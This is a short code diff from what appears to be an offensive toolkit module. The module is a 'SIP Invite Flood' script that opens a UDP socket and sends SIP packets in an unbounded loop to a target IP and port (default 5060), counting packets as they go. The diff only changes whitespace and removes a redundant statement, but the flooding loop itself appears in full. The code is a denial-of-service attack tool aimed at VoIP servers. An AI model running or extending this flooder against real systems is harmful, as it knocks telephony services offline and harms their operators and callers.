@@ -13,7 +13,7 @@ REQUIRED_OPTIONS = {"IP": "", "PORT": "standar port 5060"}
 def execute(options):
     ip = options.get("IP")
     port = int(options.get("PORT"))
-    
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     print(f"[*] Starting SIP Invite Flood on {ip}:{port}")
     count = 0
@@ -31,10 +31,9 @@ def execute(options):
             sock.sendto(payload.encode(), (ip, port))
             count += 1
             print(f"[!] Sent {count} packets...", end="\r")
-            
+
     except KeyboardInterrupt:
         print(f"[*] Total packets > {count}")
-        pass
     except Exception as e:
         print(f"ERROR: {e}")
     finally:
